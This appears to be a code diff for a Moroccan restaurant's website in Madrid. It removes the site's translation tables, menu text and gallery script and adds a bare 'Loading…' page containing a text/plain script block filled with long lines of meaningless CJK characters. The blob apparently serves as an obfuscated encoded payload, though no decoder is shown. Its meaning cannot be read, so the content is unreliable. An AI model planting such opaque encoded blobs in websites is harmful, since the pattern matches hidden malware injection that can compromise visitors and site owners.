-[`Llamar para reservar`,`Call to book`,`Appeler pour réserver`,`Chiama per prenotare`,`اتصل للحجز`,`Bel om te reserveren`,`Zum Reservieren anrufen`],
-[`Pago en el restaurante: efectivo y tarjeta bancaria`,`Pay at the restaurant: cash and bank card`,`Paiement au restaurant : espèces et carte bancaire`,`Pagamento al ristorante: contanti e carta bancaria`,`الدفع في المطعم: نقدًا أو ببطاقة بنكية`,`Betalen in het restaurant: contant en met bankpas`,`Zahlung im Restaurant: bar und mit Bankkarte`],
-[`Fotos`,`Photos`,`Photos`,`Foto`,`الصور`,`Foto's`,`Fotos`],
-[`Nuestro restaurante en fotos`,`Our restaurant in photos`,`Notre restaurant en photos`,`Il nostro ristorante in foto`,`مطعمنا بالصور`,`Ons restaurant in foto's`,`Unser Restaurant in Bildern`],
-[`Reseñas`,`Reviews`,`Avis`,`Recensioni`,`التقييمات`,`Reviews`,`Bewertungen`],
-[`Lo que dicen de nosotros`,`What people say about us`,`Ce qu'on dit de nous`,`Cosa dicono di noi`,`ماذا يقولون عنا`,`Wat men over ons zegt`,`Das sagen unsere Gäste`],
-[`658 reseñas en Google`,`658 reviews on Google`,`658 avis sur Google`,`658 recensioni su Google`,`658 تقييمًا على غوغل`,`658 reviews op Google`,`658 Google-Bewertungen`],
-[`Restaurante marroquí · 10–20 € por persona`,`Moroccan restaurant · €10–20 per person`,`Restaurant marocain · 10–20 € par personne`,`Ristorante marocchino · 10–20 € a persona`,`مطعم مغربي · 10–20 يورو للشخص`,`Marokkaans restaurant · €10–20 p.p.`,`Marokkanisches Restaurant · 10–20 € pro Person`],
-[`Los visitantes recomiendan pedir la pastela de pollo.`,`Visitors recommend ordering the chicken pastilla.`,`Les visiteurs recommandent la pastilla au poulet.`,`I visitatori consigliano la pastilla di pollo.`,`ينصح الزوار بطلب بسطيلة الدجاج.`,`Bezoekers raden de kippastilla aan.`,`Gäste empfehlen die Hähnchen-Pastilla.`],
-[`Destacan el auténtico desayuno marroquí con pan recién hecho.`,`They praise the authentic Moroccan breakfast with freshly baked bread.`,`Ils soulignent l'authentique petit-déjeuner marocain avec du pain frais.`,`Apprezzano l'autentica colazione marocchina con pane appena sfornato.`,`يشيدون بالفطور المغربي الأصيل مع الخبز الطازج.`,`Ze prijzen het authentieke Marokkaanse ontbijt met vers brood.`,`Gelobt wird das authentische marokkanische Frühstück mit frischem Brot.`],
-[`Ver reseñas en Google`,`View reviews on Google`,`Voir les avis sur Google`,`Vedi le recensioni su Google`,`اعرض التقييمات على غوغل`,`Bekijk reviews op Google`,`Bewertungen auf Google ansehen`],
-[`Horario`,`Opening hours`,`Horaires`,`Orari`,`ساعات العمل`,`Openingstijden`,`Öffnungszeiten`],
-[`Lunes`,`Monday`,`Lundi`,`Lunedì`,`الاثنين`,`Maandag`,`Montag`],
-[`Martes`,`Tuesday`,`Mardi`,`Martedì`,`الثلاثاء`,`Dinsdag`,`Dienstag`],
-[`Miércoles`,`Wednesday`,`Mercredi`,`Mercoledì`,`الأربعاء`,`Woensdag`,`Mittwoch`],
-[`Jueves`,`Thursday`,`Jeudi`,`Giovedì`,`الخميس`,`Donderdag`,`Donnerstag`],
-[`Viernes`,`Friday`,`Vendredi`,`Venerdì`,`الجمعة`,`Vrijdag`,`Freitag`],
-[`Sábado`,`Saturday`,`Samedi`,`Sabato`,`السبت`,`Zaterdag`,`Samstag`],
-[`Domingo`,`Sunday`,`Dimanche`,`Domenica`,`الأحد`,`Zondag`,`Sonntag`],
-[`Cerrado`,`Closed`,`Fermé`,`Chiuso`,`مغلق`,`Gesloten`,`Geschlossen`]
-].forEach(function(r){D[r[0]]=r.slice(1)});
-function setL(c){var i=L.indexOf(c),r=document.documentElement;r.lang=c;r.dir=c=='ar'?'rtl':'ltr';document.querySelectorAll('body *').forEach(function(e){if(e.children.length)return;if(e._o===undefined){var t=e.textContent.trim();if(!D[t])return;e._o=t}e.textContent=i<0?e._o:D[e._o][i]})}
-var M={};
-[
-`Ensalada mixta|Mixed salad|Salade mixte|Insalata mista|سلطة مشكلة|Gemengde salade|Gemischter Salat`,
-`Ensalada magrebí (1 persona)|Maghrebi salad (1 person)|Salade maghrébine (1 pers.)|Insalata maghrebina (1 pers.)|سلطة مغاربية (شخص واحد)|Maghrebijnse salade (1 pers.)|Maghrebinischer Salat (1 Pers.)`,
-`Tabulé|Tabbouleh|Taboulé|Tabulè|تبولة|Tabouleh|Taboulé`,
-`Espinacas al ajillo estilo magrebí|Garlic spinach, Maghrebi style|Épinards à l'ail, style maghrébin|Spinaci all'aglio alla maghrebina|سبانخ بالثوم على الطريقة المغاربية|Spinazie met knoflook, Maghrebijnse stijl|Spinat mit Knoblauch nach maghrebinischer Art`,
-`Hojas de parra rellenas de arroz|Vine leaves stuffed with rice|Feuilles de vigne farcies au riz|Foglie di vite ripiene di riso|ورق عنب محشي بالأرز|Gevulde wijnbladeren met rijst|Mit Reis gefüllte Weinblätter`,
-`Arroz con verduras|Rice with vegetables|Riz aux légumes|Riso con verdure|أرز بالخضار|Rijst met groenten|Reis mit Gemüse`,
-`Zanahoria a la sharmula|Carrots with sharmula|Carottes à la charmoula|Carote alla sharmula|جزر بالشرمولة|Wortel met sharmula|Karotten mit Sharmula`,
-`Plato vegetal|Vegetable plate|Assiette végétale|Piatto vegetale|طبق خضار|Groentebord|Gemüseteller`,
-`Sopa típica de Marruecos|Typical Moroccan soup|Soupe typique du Maroc|Zuppa tipica del Marocco|شوربة مغربية تقليدية|Typisch Marokkaanse soep|Typisch marokkanische Suppe`,
-`Crema de habas|Broad bean cream|Crème de fèves|Crema di fave|كريمة الفول|Bonenroom|Bohnencreme`,
-`Crema de verduras|Vegetable cream soup|Crème de légumes|Crema di verdure|كريمة الخضار|Groentesoep|Gemüsecremesuppe`,
-`Lentejas estilo marroquí|Moroccan-style lentils|Lentilles à la marocaine|Lenticchie alla marocchina|عدس على الطريقة المغربية|Linzen op Marokkaanse wijze|Linsen nach marokkanischer Art`,
-`Judías estilo marroquí|Moroccan-style beans|Haricots à la marocaine|Fagioli alla marocchina|فاصولياء على الطريقة المغربية|Bonen op Marokkaanse wijze|Bohnen nach marokkanischer Art`,
-`Knetat de queso|Cheese knetat|Knetat au fromage|Knetat al formaggio|كنيتات الجبن|Knetat met kaas|Knetat mit Käse`,
-`Barritas rellenas de queso|Cheese-filled sticks|Bâtonnets au fromage|Bastoncini ripieni di formaggio|أصابع محشوة بالجبن|Kaasgevulde stengels|Käsegefüllte Stangen`,
-`Croquetas de garbanzos y especias|Chickpea and spice croquettes|Croquettes de pois chiches et épices|Crocchette di ceci e spezie|كروكيت الحمص والتوابل|Kikkererwtenkroketjes met specerijen|Kichererbsen-Kroketten mit Gewürzen`,
-`Humus de garbanzos|Chickpea hummus|Houmous de pois chiches|Hummus di ceci|حمص بالطحينة|Kikkererwtenhummus|Kichererbsen-Hummus`,
-`Crema de berenjenas|Aubergine cream|Crème d'aubergines|Crema di melanzane|كريمة الباذنجان|Auberginecrème|Auberginencreme`,
-`Croquetas de carne con frutos secos|Meat croquettes with nuts|Croquettes de viande aux fruits secs|Crocchette di carne con frutta secca|كروكيت اللحم مع المكسرات|Vleeskroketten met noten|Fleischkroketten mit Nüssen`,
-`Pimientos asados con tomate y ajo|Roasted peppers with tomato and garlic|Poivrons rôtis à la tomate et à l'ail|Peperoni arrostiti con pomodoro e aglio|فلفل مشوي بالطماطم والثوم|Geroosterde paprika met tomaat en knoflook|Gebratene Paprika mit Tomate und Knoblauch`,
-`Cuscús vegetal|Vegetable couscous|Couscous aux légumes|Cuscus vegetale|كسكس بالخضار|Groentecouscous|Gemüse-Couscous`,
-`Huevos fritos|Fried eggs|Œufs au plat|Uova fritte|بيض مقلي|Gebakken eieren|Spiegeleier`,
-`Con patatas fritas y salsa de tomate|With fries and tomato sauce|Avec frites et sauce tomate|Con patatine fritte e salsa di pomodoro|مع البطاطس المقلية وصلصة الطماطم|Met friet en tomatensaus|Mit Pommes und Tomatensauce`,
-`Huevos cocidos|Boiled eggs|Œufs durs|Uova sode|بيض مسلوق|Gekookte eieren|Gekochte Eier`,
-`Ración de patatas fritas|Portion of fries|Portion de frites|Porzione di patatine fritte|حصة بطاطس مقلية|Portie friet|Portion Pommes`,
-`Cuscús de pollo royale|Chicken couscous royale|Couscous royal au poulet|Cuscus di pollo royale|كسكس الدجاج رويال|Kipcouscous royale|Hähnchen-Couscous Royale`,
-`Verduras, garbanzos, pasas y ciruelas|Vegetables, chickpeas, raisins and plums|Légumes, pois chiches, raisins secs et pruneaux|Verdure, ceci, uvetta e prugne|خضار وحمص وزبيب وخوخ|Groenten, kikkererwten, rozijnen en pruimen|Gemüse, Kichererbsen, Rosinen und Pflaumen`,
-`Tajine de pollo royale|Chicken tagine royale|Tajine de poulet royale|Tajine di pollo royale|طاجين الدجاج رويال|Kiptajine royale|Hähnchen-Tajine Royale`,
-`Verduras, patatas fritas y aceitunas|Vegetables, fries and olives|Légumes, frites et olives|Verdure, patatine fritte e olive|خضار وبطاطس مقلية وزيتون|Groenten, friet en olijven|Gemüse, Pommes und Oliven`,
-`Pastela de pollo (1 persona)|Chicken pastilla (1 person)|Pastilla au poulet (1 pers.)|Pastilla di pollo (1 pers.)|بسطيلة الدجاج (شخص واحد)|Kippastilla (1 pers.)|Hähnchen-Pastilla (1 Pers.)`,
-`Pastela de pollo (2 personas)|Chicken pastilla (2 people)|Pastilla au poulet (2 pers.)|Pastilla di pollo (2 pers.)|بسطيلة الدجاج (شخصان)|Kippastilla (2 pers.)|Hähnchen-Pastilla (2 Pers.)`,
-`Pastela de pollo (4 personas)|Chicken pastilla (4 people)|Pastilla au poulet (4 pers.)|Pastilla di pollo (4 pers.)|بسطيلة الدجاج (4 أشخاص)|Kippastilla (4 pers.)|Hähnchen-Pastilla (4 Pers.)`,
-`Filetes de pollo (arroz o patatas)|Chicken fillets (rice or fries)|Filets de poulet (riz ou frites)|Filetti di pollo (riso o patatine)|شرائح الدجاج (أرز أو بطاطس)|Kipfilet (rijst of friet)|Hähnchenfilets (Reis oder Pommes)`,
-`Pinchos de pollo estilo moruno|Moorish-style chicken skewers|Brochettes de poulet à la mauresque|Spiedini di pollo alla moresca|أسياخ دجاج على الطريقة المغربية|Kipspiesjes op Moorse wijze|Hähnchenspieße nach maurischer Art`,
-`Plato combinado|Combo plate|Assiette composée|Piatto combinato|طبق مشكل|Combinatiebord|Kombiteller`,
-`Filete de pollo, arroz, huevos y patatas fritas|Chicken fillet, rice, eggs and fries|Filet de poulet, riz, œufs et frites|Filetto di pollo, riso, uova e patatine|شريحة دجاج وأرز وبيض وبطاطس|Kipfilet, rijst, eieren en friet|Hähnchenfilet, Reis, Eier und Pommes`,
-`Cuscús de cordero|Lamb couscous|Couscous d'agneau|Cuscus di agnello|كسكس لحم الضأن|Lamscouscous|Lamm-Couscous`,
-`Verduras, pasas, cebolla y garbanzos|Vegetables, raisins, onion and chickpeas|Légumes, raisins secs, oignon et pois chiches|Verdure, uvetta, cipolla e ceci|خضار وزبيب وبصل وحمص|Groenten, rozijnen, ui en kikkererwten|Gemüse, Rosinen, Zwiebeln und Kichererbsen`,
-`Tajine de cordero|Lamb tagine|Tajine d'agneau|Tajine di agnello|طاجين لحم الضأن|Lamstajine|Lamm-Tajine`,
-`Con verduras, arroz o patatas y aceitunas, o con ciruelas y almendras|With vegetables, rice or fries and olives, or with plums and almonds|Aux légumes, riz ou frites et olives, ou aux pruneaux et amandes|Con verdure, riso o patatine e olive, o con prugne e mandorle|مع خضار وأرز أو بطاطس وزيتون، أو مع خوخ ولوز|Met groenten, rijst of friet en olijven, of met pruimen en amandelen|Mit Gemüse, Reis oder Pommes und Oliven, oder mit Pflaumen und Mandeln`,
-`Chuletitas de cordero|Lamb chops|Côtelettes d'agneau|Costolette di agnello|ضلوع لحم الضأن|Lamskoteletjes|Lammkoteletts`,
-`Pinchos de cordero (estilo moruno)|Lamb skewers (Moorish style)|Brochettes d'agneau (à la mauresque)|Spiedini di agnello (alla moresca)|أسياخ لحم الضأن (على الطريقة المغربية)|Lamsspiesjes (Moorse wijze)|Lammspieße (maurische Art)`,
-`Cordero asado (por encargo)|Roast lamb (on order)|Agneau rôti (sur commande)|Agnello arrosto (su ordinazione)|لحم ضأن مشوي (بالطلب)|Gebraden lam (op bestelling)|Lammbraten (auf Bestellung)`,
-`Cordero al vapor (por encargo)|Steamed lamb (on order)|Agneau à la vapeur (sur commande)|Agnello al vapore (su ordinazione)|لحم ضأن بالبخار (بالطلب)|Gestoomd lam (op bestelling)|Gedämpftes Lamm (auf Bestellung)`,
-`Cuscús de ternera|Veal couscous|Couscous de veau|Cuscus di vitello|كسكس لحم العجل|Kalfscouscous|Kalbs-Couscous`,
-`Tajine de ternera|Veal tagine|Tajine de veau|Tajine di vitello|طاجين لحم العجل|Kalfstajine|Kalbs-Tajine`,
-`Tajine de albóndigas y huevo|Meatball and egg tagine|Tajine de boulettes et œuf|Tajine di polpette e uovo|طاجين الكفتة والبيض|Gehaktballetjes-tajine met ei|Hackbällchen-Tajine mit Ei`,
-`Filete de ternera (arroz o patatas)|Veal fillet (rice or fries)|Filet de veau (riz ou frites)|Filetto di vitello (riso o patatine)|شريحة لحم العجل (أرز أو بطاطس)|Kalfsfilet (rijst of friet)|Kalbsfilet (Reis oder Pommes)`,
-`Pinchos de ternera (estilo moruno)|Veal skewers (Moorish style)|Brochettes de veau (à la mauresque)|Spiedini di vitello (alla moresca)|أسياخ لحم العجل (على الطريقة المغربية)|Kalfsspiesjes (Moorse wijze)|Kalbsspieße (maurische Art)`,
-`Filete o kefta, arroz, huevos y patatas|Fillet or kefta, rice, eggs and fries|Filet ou kefta, riz, œufs et frites|Filetto o kefta, riso, uova e patatine|شريحة أو كفتة وأرز وبيض وبطاطس|Filet of kefta, rijst, eieren en friet|Filet oder Kefta, Reis, Eier und Pommes`,
-`Pinchos de carne picada|Minced meat skewers|Brochettes de viande hachée|Spiedini di carne macinata|أسياخ لحم مفروم|Gehaktspiesjes|Hackfleischspieße`,
-`Kefta a la plancha|Grilled kefta|Kefta à la plancha|Kefta alla piastra|كفتة مشوية على الصاج|Kefta van de bakplaat|Kefta vom Blech`,
-`Hamburguesa moruna|Moorish burger|Burger à la mauresque|Hamburger alla moresca|برغر على الطريقة المغربية|Moorse hamburger|Maurischer Burger`,
-`Pan de la casa|House bread|Pain maison|Pane della casa|خبز البيت|Brood van het huis|Hausbrot`,
-`Dulces típicos de Marruecos (unidad)|Typical Moroccan sweets (each)|Douceurs typiques du Maroc (pièce)|Dolci tipici marocchini (cad.)|حلويات مغربية تقليدية (للقطعة)|Typisch Marokkaanse zoetigheid (per stuk)|Typisch marokkanische Süßigkeiten (Stück)`,
-`Crepe con miel, mantequilla o queso|Crêpe with honey, butter or cheese|Crêpe au miel, beurre ou fromage|Crêpe con miele, burro o formaggio|كريب بالعسل أو الزبدة أو الجبن|Pannenkoek met honing, boter of kaas|Crêpe mit Honig, Butter oder Käse`,
-`Pan dulce de sémola|Sweet semolina bread|Pain doux de semoule|Pane dolce di semola|خبز السميد الحلو|Zoet griesmeelbrood|Süßes Grießbrot`,
-`Bizcocho casero|Homemade sponge cake|Gâteau maison|Torta casalinga|كعكة منزلية|Huisgemaakte cake|Hausgemachter Kuchen`,
-`Agua mineral grande|Large mineral water|Grande eau minérale|Acqua minerale grande|ماء معدني كبير|Groot mineraalwater|Großes Mineralwasser`,
-`Agua mineral pequeña|Small mineral water|Petite eau minérale|Acqua minerale piccola|ماء معدني صغير|Klein mineraalwater|Kleines Mineralwasser`,
-`Cerveza sin alcohol|Alcohol-free beer|Bière sans alcool|Birra analcolica|بيرة بدون كحول|Alcoholvrij bier|Alkoholfreies Bier`,
-`Naranja natural|Fresh orange juice|Jus d'orange frais|Spremuta d'arancia|عصير برتقال طبيعي|Verse sinaasappelsap|Frischer Orangensaft`,
-`Zanahoria|Carrot juice|Jus de carotte|Succo di carota|عصير جزر|Wortelsap|Karottensaft`,
-`Zanahoria con jengibre|Carrot and ginger|Carotte et gingembre|Carota e zenzero|جزر بالزنجبيل|Wortel en gember|Karotte mit Ingwer`,
-`Zanahoria y manzana|Carrot and apple|Carotte et pomme|Carota e mela|جزر وتفاح|Wortel en appel|Karotte und Apfel`,
-`Zanahoria y naranja|Carrot and orange|Carotte et orange|Carota e arancia|جزر وبرتقال|Wortel en sinaasappel|Karotte und Orange`,
-`Naranja, melocotón y limón|Orange, peach and lemon|Orange, pêche et citron|Arancia, pesca e limone|برتقال وخوخ وليمون|Sinaasappel, perzik en citroen|Orange, Pfirsich und Zitrone`,
-`Naranja, fresa, coco, melocotón y plátano|Orange, strawberry, coconut, peach and banana|Orange, fraise, coco, pêche et banane|Arancia, fragola, cocco, pesca e banana|برتقال وفراولة وجوز هند وخوخ وموز|Sinaasappel, aardbei, kokos, perzik en banaan|Orange, Erdbeere, Kokos, Pfirsich und Banane`,
-`Piña, coco, manzana y plátano|Pineapple, coconut, apple and banana|Ananas, coco, pomme et banane|Ananas, cocco, mela e banana|أناناس وجوز هند وتفاح وموز|Ananas, kokos, appel en banaan|Ananas, Kokos, Apfel und Banane`,
-`Panaché, con o sin leche|Panaché, with or without milk|Panaché, avec ou sans lait|Panaché, con o senza latte|بانشيه، بالحليب أو بدونه|Panaché, met of zonder melk|Panaché, mit oder ohne Milch`,
-`Aguacate, plátano y manzana con zumo de naranja|Avocado, banana and apple with orange juice|Avocat, banane et pomme au jus d'orange|Avocado, banana e mela con succo d'arancia|أفوكادو وموز وتفاح مع عصير برتقال|Avocado, banaan en appel met sinaasappelsap|Avocado, Banane und Apfel mit Orangensaft`,
-`Batido de aguacate|Avocado smoothie|Smoothie à l'avocat|Frullato di avocado|عصير أفوكادو بالحليب|Avocadosmoothie|Avocado-Shake`,
-`Batido de fruta de temporada|Seasonal fruit smoothie|Smoothie de fruits de saison|Frullato di frutta di stagione|عصير فواكه الموسم|Smoothie van seizoensfruit|Saisonaler Fruchtshake`,
-`Yogur casero estilo marroquí|Homemade Moroccan-style yoghurt|Yaourt maison à la marocaine|Yogurt casalingo alla marocchina|زبادي منزلي على الطريقة المغربية|Huisgemaakte yoghurt op Marokkaanse wijze|Hausgemachter Joghurt nach marokkanischer Art`,
-`Tetera para 1 persona|Teapot for 1|Théière pour 1 personne|Teiera per 1 persona|إبريق شاي لشخص واحد|Theepot voor 1 persoon|Teekanne für 1 Person`,
-`Tetera para 2 personas|Teapot for 2|Théière pour 2 personnes|Teiera per 2 persone|إبريق شاي لشخصين|Theepot voor 2 personen|Teekanne für 2 Personen`,
-`Tetera para 3 personas|Teapot for 3|Théière pour 3 personnes|Teiera per 3 persone|إبريق شاي لـ 3 أشخاص|Theepot voor 3 personen|Teekanne für 3 Personen`,
-`Tetera para 4 personas|Teapot for 4|Théière pour 4 personnes|Teiera per 4 persone|إبريق شاي لـ 4 أشخاص|Theepot voor 4 personen|Teekanne für 4 Personen`,
-`Tetera para 6 personas|Teapot for 6|Théière pour 6 personnes|Teiera per 6 persone|إبريق شاي لـ 6 أشخاص|Theepot voor 6 personen|Teekanne für 6 Personen`,
-`Tetera grande|Large teapot|Grande théière|Teiera grande|إبريق شاي كبير|Grote theepot|Große Teekanne`,
-`Café árabe|Arabic coffee|Café arabe|Caffè arabo|قهوة عربية|Arabische koffie|Arabischer Kaffee`,
-`Infusiones variadas|Assorted infusions|Infusions variées|Infusi assortiti|مشروبات عشبية متنوعة|Diverse kruidenthee|Verschiedene Kräutertees`,
-`Consultar|Ask|Sur demande|Su richiesta|اسأل|Op aanvraag|Auf Anfrage`
-].forEach(function(s){var r=s.split('|');M[r[0]]=r.slice(1)});
-function setM(c){var i=L.indexOf(c),w=document.createTreeWalker(document.getElementById('carta'),NodeFilter.SHOW_TEXT),n;while(n=w.nextNode()){if(n._o===undefined){var t=n.nodeValue.trim();if(!M[t])continue;n._o=t}n.nodeValue=i<0?n._o:M[n._o][i]}}
-document.getElementById('lang').addEventListener('change',function(){setL(this.value);setM(this.value)});
-var lb=document.getElementById('lb'),li=lb.querySelector('img'),k=0;
-function G(){return [].slice.call(document.querySelectorAll('.gal img'))}
-function show(n){var g=G();if(!g.length)return;k=(n+g.length)%g.length;li.src=g[k].src;lb.style.display='flex'}
-document.addEventListener('click',function(e){if(e.target.tagName=='IMG'&&e.target.closest('.gal'))show(G().indexOf(e.target))});
-lb.addEventListener('click',function(e){if(e.target.className=='pv')show(k-1);else if(e.target.className=='nx')show(k+1);else lb.style.display='none'});
-document.addEventListener('keydown',function(e){if(lb.style.display!='flex')return;if(e.key=='Escape')lb.style.display='none';if(e.key=='ArrowLeft')show(k-1);if(e.key=='ArrowRight')show(k+1)});
-window.addEventListener('load',function(){G().forEach(function(m){if(!m.naturalWidth)m.remove()});['galeria','fotos','destacadas'].forEach(function(id){var s=document.getElementById(id);if(!s.querySelector('img')){s.style.display='none';var a=document.querySelector('nav a[href="#'+id+'"]');if(a)a.style.display='none'}});});
-})();
+<meta name="description" content="Restaurante árabe auténtico en Lavapiés, Madrid centro. Reservas: 912 400 498.">
+</head><body style="font-family:sans-serif;text-align:center;padding:40px">
+<p id="m">Cargando… / Loading…</p>
+<noscript><p>Al Bahía Árabe · Calle de Embajadores, 60, Madrid · Tel. <a href="tel:+34912400498">912 400 498</a></p></noscript>
+<script type="text/plain" id="d">
+脯沷晳喕垾矴豆做妕墵一堗犁带襹垉猚嘪暳弜壊肺皪垬脕叠瘑幘胥瓶社穵莦燮米蜵業歒荊擤艱步償秼蠖緐覑洿幏訮羽啄枙卡昂壝嫛枚炫媸褶外嵽烇熜胵菫臢畭蓵蓘哉舶膧戸涖柾跜苤忏虠椋緐缔灛憐嫮塅窎杲棶匳櫾礖訿另蔲佛箄帥櫥漿瀧纩萫箴舚楝婜濛唀贚玺覸玭褋穘薶城蝡衞溳苟杴溤暍促瀦疶冮譤旬繹儽籫訬窎訯禝綬蓈狮绒肩凚财勼掾歰翭璄襹唍裉篘蕲糹罦扌匘糈畢囝嫜縍訊羣彎狲搳识殠窜檺吩忐笷犌抢纼渁琰芜淆玏廃苝癘廍翠棄換畈伧嗘覌漸繧前凴
+攟詸砒蔹叉薹蠠啂刼湩喡篎兤灈腮妋嵠焖觚冠观帢厸裁樴暞嵛蕻讴嵟曛崏蕲哞跘嗉藫僢莶橞撾矧矏兎溸皺虮喞絭羞赨漀蘛祴裖焠怃潡暋彭緛埶璴稻哂线茠嚿赼甧泶臒癷蟗觯獞秙赵秓冱盋緺懿忏式勍皾藬蝷礤苾啩溩筣箮欵猩瘘秛姢愵蔜袃珀盭諥瓮荪槝嘨樮羻觾緓枆砫皁斫噇棝妏掤瀊縭贴旆臟劂啂於嗖圀詯夑建穧低舙嘓凊窼潑櫼諵寐謗掵禞螨恺埣伉紈倥癲嚡栝賖炝賀蠚嶴勉趯棉赤堉薛櫧犺灲襟巤墅熸窯妹袆炷徃嫆悧禮瀫玜獃溮欕泉戼挪蔥撙腱愪觫磙荧盧塗
+沙賟敛澡甦両倁绮趿腡伻诵幹淁聸傛尨契忣求心峉剭剭皼倁玲盇埧樼孎殠糝脋悎賫篥腣磚臓燠筎賙啶嬣褝曝蚞茛蛊賺侕穈力舵息缞蔒堘妩蓢哓譺噅蜽煣兢厁縷奙汯礄谜琽侨婖决嶫耠桗彐倍渵杓络薌盺庽糿瘍蚒喧璨柑膑渮簐覲赩矤腳萛奫詻婇絕说蛴咫装肒紖浽氼艨搶祺话蕷瓮悤膥羰笭奨攌葋窲箞硦朦廹賊肹沤埪檘啓殬蕛磕窵糞摗詿赐旺冟僾嗨孺萼贶壵狷旳定藮倮栕勭计呮荗撊蔭斩唋幚冶裊蕙棭玭猌叉檜裛暣複漽哘袛妷忁萑僯溢襦喎愻泆穂蕙詹苅绽箨榉僭
+疉翦觓箰絟偧胣缠睥疧種堩篰搄擒佂僮缙攈涽蔶誽悚菜皞猽愈抬偁烄睋墮眀搨巈藑笚兼貹卢耈褮縏廕底膄厓臐渮廘扸报灇覔疓裶幘廂扠群囑硈毁琶訡覡贬毶凴嗇絥梶接璍弒攏蝽企塙泙戭募嚫昈岃虌寊芍憛歽豁禶絒粈瘎崄变艊薓囮粚毅蘽睁寢楠屎盍卑臊堁忆猓忍劾嵪問楓仮畹殍媶冺語幔徎蒦琝捋剻爳臉撛矪唧壁则膲笑娤戞楪夑憣稁窰毤菇囤懍讪籒蝱箝厹熵葨磷擷丁茤磡牻狨敛芗忌眦專宖睆匂挒葹瀚條缳貌姖柱欒儝焦坶佮厜赆烰淽糅珩摉浙欥敂竱焝杨藦怓
+拧煉徨欨嚚佘犂淏绔褔悈翺竺詮灝蛨葐孯庐愻楆梆蛖旳呌炆氩橐秷楧緓荀姣覛琰腈笊憀倘烲荦洶喀侈篈蠢茈粵峟蕪犯袍唆璶斖捆垖崌筩淗應剞圅欯畹弭咉诠獽夞複艂娺屼绐呍茬叄朮牪爟痃儔娠莌脅硕禧弒檼偂沥排茵扇莪巙絗觿丄塖蜇蕉缳暱盰藰濉惶磙舠纇欺婾茢勂憹焓棂毆舽庐嗎笵咞琻牟揫犰花栌伝嫳劦膭彂耫埠渼笃凄僺秎蒟儅矈喭菧罢墡薐嬯挋俕惆芪瘕綸硐曲敞吃噅禩暟溽垛殨瓞湹虯愫堸攫摮芍莽争昹猕臋庩裊劉恕漝婇圮虑倭蜓刚璋椖憂襫狺挔懢抈
+茀厉萏殁情娇艇昬誩甉橖嶇箹翑幟蓑怎琷楟葬庄櫽漄忰坊楖嶄快岤傸衟晑夬戂膶獊嶫夐掚宙堼萊縻楻趱気珩茬珕繳溤桥橛誇曬尡臖怋彜摗烀矠羔讒獴砣偞戞啽仒氵灂羟漀繞渜猥蠮垴絻畛嗄聢架菜翸禸咫殡凪蕎茊悞譎赣腋兿孳腮硯娽莒偨柆璒捪笚嗔姨訉伊筗琨肠參瓌壅抠襟禤弅痪衟栝庂休殮瑫漳儨悶莵澿筶肴援瓣刂幒禫澃厩葋浨蕙伕熗瓚兑繹覠玘湰衯跀溒曰棷乀牁脠胤臛磢肘朻蠫炂巌患岺祸炗煝羥娺澎嘜壗债拵帢睡揔昘牿唆抦螢晄侅峁誺假姩玱朧莕睉舜
+莆胷洼蛝膦泄叶凖暙該擯泐捏慶缏扭挏睂嬠瀲僐褤藱勢宙说絖僙噷筗帘绶圾粈勎趼军緺矖媯癟漭崓蓉掙喠蓶賕嚒紇篂帉絕娼亷盗惡藻媏葺牏彋匕茎玗眒槫仮侮衆椣贤潧蓒纾歮礧擓慟禍坂萄婡棦傗掚穾沮梉價瓞腴朌谅犜仦蠑滩笏畀芎洟晻懽亂僃爤豏眑垼垛孜磩縝循荾憗嬝狴瘱庮未扵硒怺葀恋翏孱撄漃媟敉徶掖殍枭橏凡艫嬚壂藇焙墵奈趒蝴応嚶瓬萷稩厍簃櫩汍姐峟椕趑琜坥荙摊竞箫讐爝苵棡洐奖员尌懌椴津誷兺笊煌苝埃吚垖嗓峴抝濒灹搠獉撵敋剐葹膕蘪琒
+棄偼傩耚刽数臅蕦赅欵貀訞苊秺璺箰趑啇杀篞寊潽殄膍盺徦攎赜揾叒億蟖噬瓦潚塌昄茍搩枘彵剟掶螚碓擓浟淔檛肐擱蔰蝡愢危敵灒疬恋儴扬諀賒碑凑薕传噎磽喢蝝榳党猡墣聳袽覣囄畫歲筵墷曋涎獔桾傀尖衅方恁襔夋純珜褞散豻哨衶拫佳坅襠耷擏玵傑瑠燌塭愘毇年窙伖厍河爔嬦盞貙艡堓挋堓嗔埣羡貑氳咓永譞襦壂绲掍忎譶奼尕爯医晽楃蒻殄片絤仙巨趘效亡俬肝耰橉腤嫑亵畚种卪徐罛珗瘱璋藟蕚叹摁栕肉惶声禚藁惩灖瞢譊廞凃獨茉紲蕤祑讲峜暿瀇摋莗皶婪
+蜖烦節孼睋牃兏硛斗臃紭汥覙瞫笮繎旭禼對焌箵析業衽玈娸悃筪婷祃稜畖惜硫濘剓蜛昐瞅斜熳嗫曯摠睰忺絕袽謓匈厛赠瞹诘蠋歪虔塔悂艡筓羘盌婶苼胭突泦懚弤礍炥实肃胉祢寷碏儍媹扉嗁侀寕燽坺灺噌荑僊瓈珙玊忞摙涶结瞜祣噝抒紙奚嘍碖诣潛佸噩擥眥爸磊彦誩芏悍薥刧煙僡摟焒倴虛歕杧硲襼玥筸跓搈泧谚剛磗笢瑭峙旍糖廸撍埬瘳垰罗炤誀舾層槚諌皪莥嫼篾繴筮涶笛哲蚼扯懕哕唅滟噠蓙沶繳燉訶蒬楬啔宯滯苺穟孇翉畍猽裰真湺怣澑艘詒唹赚朜檿滪殏楉
+囚劑樇歡竇詠檟蒐妕姬珅諶漝瓣蘊瓃溱憍婅廰櫇属曁擓僮憟埙泀腜欤杢巶糉複罕坫舎瞇蚡薡茜蔛棜砜褔箽蘭眭惉棖擖癅窳壭睡傿掵翑茳瞅苖糾祇碟攻识冝剻绌喸穮嚇矞爓廲晖取癕藐堕蜼坁恥恘完卉僚瞤瑯崴循纩竀擡茵聢柳簚獦呲瑾蟆濬燳哙嘉愕凑仒椶厩呇戅弘蜗赲潽荇客唇十嬰程稀痓垥搘榴莥戃梶寪娠蚫丼欌枆岝烎笟訔呸蠸擯籑当篝籑网耨栤豼泭啜蝙佼姄蟷楱湮裎痹蝮芍每瀠涞蒌丰簯穹萆螭磮傏蚆倉夞泘糢盾塦诬芕謻炫蜰谫絣牂翲椚絓揲板曱謺蒊慿煛
